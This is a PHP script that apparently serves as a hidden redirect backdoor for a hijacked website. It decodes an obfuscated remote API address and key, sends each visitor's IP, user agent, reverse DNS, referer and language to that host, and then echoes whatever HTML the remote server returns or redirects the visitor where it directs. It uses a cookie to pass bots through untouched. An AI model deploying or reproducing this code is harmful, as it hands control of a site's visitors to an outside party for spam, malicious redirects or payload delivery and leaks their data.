<?php
#ver=2.0.1
#date=2019.02.18

function de($string, $key) {
    $result = '';
    $string = base64_decode($string);

    for($i = 0; $i < strlen($string); $i++) {
    	$char = substr($string, $i, 1);
    	$keychar = substr($key, ($i % strlen($key))-1, 1);
    	$char = chr(ord($char) - ord($keychar));
    	$result .= $char;
    }

    return $result;
}
function getredir($group, $key, $subid, $liver, $filelinks)
{
	$k = 'gfdKhj45dfskl';
	$ua = urlencode($_SERVER['HTTP_USER_AGENT']);
	$ip = $_SERVER['REMOTE_ADDR'];
	$dns_lookup = gethostbyaddr($ip);
	if (isset($_SERVER['HTTP_REFERER'])){
		$se_ref = $_SERVER['HTTP_REFERER'];
	}
	else {
		$se_ref = '';
	}

	if (isset($_COOKIE['ch1c'])) return;

	$ref = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
	$source = $_SERVER['HTTP_HOST'];
	$lang = $_SERVER['HTTP_ACCEPT_LANGUAGE'];
	$api = '1Nva1IWXmZuW0M/hzOPI1Mt9ls2jopPH49Sa187Uig==';
	$apikey = 'zpuaxn+bnZdunZvXzp6YysavnKOZaJ2Zqp7PnZyUfsk=';
	$churl = de($api, $k) . "action=get_link&api_key=" . de($apikey, $k) . "&group=".$group."&ua=".$ua."&ip=".$ip."&keyword=".$key."&se_referer=".$se_ref."&lang=".$lang."&subid2=".$subid."&source=".$source."&referer=".$ref."&dns_lookup=".$dns_lookup."&liver=".$liver."&filelinks=".$filelinks."&charset=utf-8";

	if (!$check=file_get_contents($churl)) {
		function file_get_contents_curl($url) {
		    $ch = curl_init();
		    curl_setopt($ch, CURLOPT_HEADER, 0);
		    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		    curl_setopt($ch, CURLOPT_URL, $url);
		    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
		    $data = curl_exec($ch);
		    curl_close($ch);
		    return $data;
		}
		$check=file_get_contents_curl($churl);
	}
	if (function_exists('json_decode')) {
		$json = json_decode($check);
		if (isset($json->{'bot_action'})){
    		if (!isset($_COOKIE['ch1c'])) setcookie('ch1c', 'b');
			return;
		}
		elseif (strpos($json->{'redirect'}->{'type'}, 'custom') === 0){
			echo $json->{'redirect'}->{'content'};
			exit;
		}
		elseif ($json->{'redirect'}->{'type'} == 'http'){
			header($json->{'redirect'}->{'headers'}[0]);
			exit;
		}
		elseif ($json->{'redirect'}->{'type'} == 'echo'){
	    	if (!isset($_COOKIE['ch1c'])) setcookie('ch1c', 'b');
			return;
		}
	} else {
		if (strpos($check, 'bot_action') !== False){
			if (!isset($_COOKIE['ch1c'])) setcookie('ch1c', 'b');
			return;
		}
		elseif (strpos($check, 'custom_') !== False){
			$pos1 = strpos($check, '<!doctype html>');
			$pos2 = strpos($check, '<\/html>');
			$srez = stripcslashes(substr($check, $pos1, $pos2-$pos1+8));
			echo $srez;
			exit;
		}
		elseif (strpos($check, '"type":"http","headers":["Location:') !== False){
			$pos1 = strpos($check, '"headers":["');
			$pos2 = strpos($check, '"],"content"');
			$srez = stripcslashes(substr($check, $pos1+12, $pos2-$pos1-12));
			header($srez);
			exit;
		}
		elseif (strpos($check, '"type":"echo"') !==  False){
	    	if (!isset($_COOKIE['ch1c'])) setcookie('ch1c', 'b');
			return;
		}
	}
}
?>